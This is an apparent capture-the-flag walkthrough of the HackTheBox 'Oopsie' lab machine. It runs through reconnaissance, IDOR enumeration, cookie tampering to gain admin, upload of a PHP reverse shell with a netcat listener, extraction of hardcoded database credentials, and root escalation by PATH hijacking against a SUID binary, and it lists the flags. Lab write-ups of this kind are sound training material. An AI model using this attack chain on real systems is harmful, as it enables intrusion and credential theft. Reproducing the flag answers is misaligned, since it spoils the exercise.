

OOPSIE

	
	connect VPN to the Starting point then start the machine

		MACHINE : 10.129.95.191


			Let's Enumeration machine first by sing nmap to see witch port are open.

				sudo nmap -sCV 10.129.95.191
					Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-05 08:27 EST
					Nmap scan report for 10.129.95.191
					Host is up (0.072s latency).
					Not shown: 998 closed tcp ports (reset)
					PORT   STATE SERVICE VERSION
					22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
					| ssh-hostkey: 
					|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
					|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
					|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
					80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
					|_http-title: Welcome
					|_http-server-header: Apache/2.4.29 (Ubuntu)
					Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

            as we can see there are two ports are open, 22(SSH) and 80(HTTP). I visit website by using IP.
            
      

	task 1 
	 With what kind of tool can intercept web traffic?
	 	A proxy is an agent legally authorised to act on behalf of another party or a format that allows an investor to vote without being physically present at the meeting. Proxy is the tools that help to intercept web.

	 task 2
	 What is the path to the directory on the web-server that returns a login page?
	 	
	 	I looked source code to see if there is any hint i can find, but nothing is behidn the source code.

		As pr information given in service section the is a login page in somewhere else.

    ![Screenshot 2023-01-05 at 13 42 09](https://user-images.githubusercontent.com/49148722/211021666-9352141c-ac96-4299-89d3-ab855b30fe8f.png)

		I search for sitemaps which we can see in Firefox inspect > Debugger or we can use burp suite tools to see site maps.

		/cdn-cgi/login/

		we can visit login page by using these directory.
    
    ![Screenshot 2023-01-05 at 14 10 12](https://user-images.githubusercontent.com/49148722/211021693-b3ae7dd6-14c1-4620-9858-0649dbf7a272.png)

		I tried bunch of username/password credential to login but it wont worked. There is one more option to login as a guest 


	task 3
	What can be modified in Firefox to get access to the upload page?

		cookie

		I went throw upload page but it only accessible by admin, so I looked at cookie to see if I can bypass admin cookie
    
    ![Screenshot 2023-01-05 at 14 12 49](https://user-images.githubusercontent.com/49148722/211021790-a6b24b14-f55d-4fdf-a0a6-29c891d0f984.png)

		The cookies set with Role name and ID 
    
    ![Screenshot 2023-01-05 at 14 12 35](https://user-images.githubusercontent.com/49148722/211021825-8949aff2-9fe1-4157-b265-084998b920b1.png)

		I can try change the id variable to something else like for example 1 to see if we can enumerate the
			users:
			http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1
		I got an information disclosure vulnerability, which might be able to abuse. I have access ID and role name so, let's change in cookie and refresh.
    
    ![Screenshot 2023-01-05 at 14 23 42](https://user-images.githubusercontent.com/49148722/211021900-fb0c571e-4062-4ddf-9c68-244b8453b36d.png)

	task 4
	What is the access ID of the admin user?

		34322
    
	task 5
	On uploading a file, what directory does that file appear in on the server?
		/uploads
      ![Screenshot 2023-01-05 at 14 27 57](https://user-images.githubusercontent.com/49148722/211021941-1be3e49d-c438-44c5-904f-1835b4271dd4.png)

		 Now I have access of upload page so we can upload php reverse shell. we can create own reverse shell or we can use existing one.

		I am using existing reverse shell. If you are using Kali Linux than you can find it here "/home/Kali/SecLists-master/Web-Shells/laudanum-0.8/php/php-reverse-shell.php". Modify with $IP and $PORT with out own.
		I upload it on upload page.

		now let's find the upload directory by using gobuster.

		gobuster dir -u http://10.129.95.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      

    ![Screenshot 2023-01-05 at 15 29 21](https://user-images.githubusercontent.com/49148722/211022105-a1808247-ef1a-484a-a5c0-5e95b467cd1a.png)

			I found /uploads on a result of gobuster.

		before hit the url that i found in gobuser I started a listener pot by using 

		NC -lvvp 9009
    
    ![Screenshot 2023-01-05 at 15 28 06](https://user-images.githubusercontent.com/49148722/211022021-2ba5bbe7-a3e9-4743-a6cf-ee8536f9c589.png)

		Now I use url that I found throw gobuster http://10.129.95.191/uploads/shell.php

		Finally I get connection on my listener port. In order to have a functional shell though we can issue the following:
    
    ![Screenshot 2023-01-05 at 15 58 34](https://user-images.githubusercontent.com/49148722/211022140-80413fc7-901d-47dd-8ffe-7363b6542a9d.png)

			python3 -c 'import pty;pty.spawn("/bin/bash")'

		task 6
		What is the file that contains the password that is shared with the Robert user?

		it has restriction so we cant access some of file. website is build in php and sql so we can find some miscofiregation user /var/www/html/cdncgi/login directory. we can find source code and see what we get in there.

		cat * for real all file while grep use for  piping the output -i to ignore case sensitive words like Password.
		
		cat * | grep -i passw*

			if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
			<input type="password" name="password" placeholder="Password" />
      
      ![Screenshot 2023-01-05 at 16 09 03](https://user-images.githubusercontent.com/49148722/211022213-df93869f-7a48-477a-903b-a1e7f1dd7957.png)

		Lets find out root user in /etc/passwd directory. I found Robert

		I try to change user with "MEGACORP_4dm1n!!" but it is wrong 
		so, let's check all file if we get any important information.
		I found important information on db.php.

			<?php
				$conn = mysql_connect('localhost','robert','M3g4C0rpUs3r!','garage');
			?>

      ![Screenshot 2023-01-05 at 16 09 20](https://user-images.githubusercontent.com/49148722/211022243-7ed09613-3b69-4bc3-b3e4-c9d8a28e4b69.png)

			let's use it on Robert user.

			finally I got access of Robert here we can find the user.txt

		task 7
		What executable is run with the option "-group bug-tracker" to identify all files owned by the bug-tracker group?

			lets find -group bug-tracker by using find tag.

			find / -group bug-tracker 2>/dev/null

				I found directory for bug-tracker.
		
			/usr/bin/bugtracker

			We check what privileges and what type of file is it:
			ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
      
      ![Screenshot 2023-01-05 at 16 19 52](https://user-images.githubusercontent.com/49148722/211022303-95c21674-dec5-40d6-856f-d3817f2b9be7.png)

			There is a suit set on that binary, which is a promising exploitation path.


		task 8 
		Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
		 
		root

		task 9
		What SUID stands for?
		Set owner User ID

		task 10 
		What is the name of the executable being called in an insecure manner?

		using cat command we can read file. however it does not specify all directory, but we can exploit cat command

		task 11
		Submit user flag

			f2c74ee8db7983851ab2a96a44eb7981
      ![Screenshot 2023-01-05 at 16 35 13](https://user-images.githubusercontent.com/49148722/211022370-468b1a92-6841-41da-b7f9-0dff0299bc1f.png)

		task 12
		Submit root flag
			we got the bugtracker file but it can not execute on Robert user
			 lets navigate /tmp directory and create cat file 

			 echo "/bin/sh" > cat

			 We will then set the execute privileges

			 chmod +x cat

			 In order to exploit this we can add the /tmp directory to the PATH environmental variable.
			 	PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and Microsoft Windows, specifying a set of directories where executable programs are located.

			 use following command to execute 

			 export PATH=/tmp:$PATH

			 check the $PATH
			 echo $PATH

			 Finally execute the bugtracker from /tmp directory

			 now we have root user access.
			 go to /root directory to get root.txt flag
			af13b0bee69f8a877c3faf667f7beacf
